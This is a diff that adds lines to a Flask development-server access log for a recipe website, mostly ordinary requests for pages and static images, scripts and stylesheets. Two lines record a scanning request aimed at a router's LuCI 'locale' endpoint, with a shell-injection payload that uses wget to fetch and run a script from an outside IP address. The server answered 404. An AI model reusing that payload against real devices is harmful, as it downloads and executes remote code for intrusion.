@@ -94,3 +94,17 @@ ModuleNotFoundError: No module named 'flask_sqlalchemy'
 172.236.1.60 - - [08/Oct/2024 00:44:50] "GET /my_recipes HTTP/1.1" 200 -
 172.236.1.60 - - [08/Oct/2024 00:44:50] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
 172.236.1.60 - - [08/Oct/2024 00:45:07] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:45:15] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:45:16] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:45:16] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:45:17] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:45:18] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:45:18] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:45:18] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:45:18] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:45:18] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:45:18] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:45:18] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:45:18] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:45:19] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:45:20] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
